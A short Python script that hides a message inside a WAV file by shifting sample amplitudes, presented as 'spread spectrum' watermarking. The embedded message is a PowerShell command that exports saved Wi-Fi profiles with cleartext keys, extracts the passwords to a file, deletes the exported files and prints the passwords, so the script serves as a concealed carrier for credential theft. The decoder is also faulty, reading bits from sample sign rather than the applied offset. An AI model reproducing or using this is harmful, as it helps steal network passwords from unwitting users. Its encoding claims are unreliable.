import wave
import numpy as np

def spread_spectrum_audio_encode(audio_path, message):
    with wave.open(audio_path, 'rb') as audio_file:
        audio_params = audio_file.getparams()
        audio_frames = audio_file.readframes(audio_params.nframes)
    audio_data = np.frombuffer(audio_frames, dtype=np.int16)
    
    binary_message = ''.join(format(ord(char), '08b') for char in message)
    message_length = len(binary_message)
    
    watermarked_audio_data = audio_data.copy()
    for i in range(message_length):
        if binary_message[i] == '1':
            watermarked_audio_data[i] += 100  # Increase amplitude for '1'
        else:
            watermarked_audio_data[i] -= 100  # Decrease amplitude for '0'
    
    with wave.open('watermarked_audio.wav', 'wb') as watermarked_audio_file:
        watermarked_audio_file.setparams(audio_params)
        watermarked_audio_file.writeframes(watermarked_audio_data.tobytes())

# function to decode audio for verification of the data being encoded properly
def spread_spectrum_audio_decode(audio_path, message_length):
    with wave.open(audio_path, 'rb') as watermarked_audio_file:
        watermarked_audio_params = watermarked_audio_file.getparams()
        watermarked_audio_frames = watermarked_audio_file.readframes(watermarked_audio_params.nframes)
    
    watermarked_audio_data = np.frombuffer(watermarked_audio_frames, dtype=np.int16)
    extracted_message = ''
    for i in range(message_length):
        if watermarked_audio_data[i] > 0:
            extracted_message += '1'  # High amplitude indicates '1'
        else:
            extracted_message += '0'  # Low amplitude indicates '0'
    
    data = ''.join(chr(int(extracted_message[i:i + 8], 2)) for i in range(0, len(extracted_message), 8))
    return data

# Replace audio path to audio file
audio_path = 'example_audio.wav'
message = "netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''} > pass.txt ; rm -r Wi-Fi* ; cat pass.txt"
print(f'[*] Length of Message: {len(message)}') # remember length of message
spread_spectrum_audio_encode(audio_path, message)

decoded_message = spread_spectrum_audio_decode('watermarked_audio.wav', len(message) * 8)
print(decoded_message)
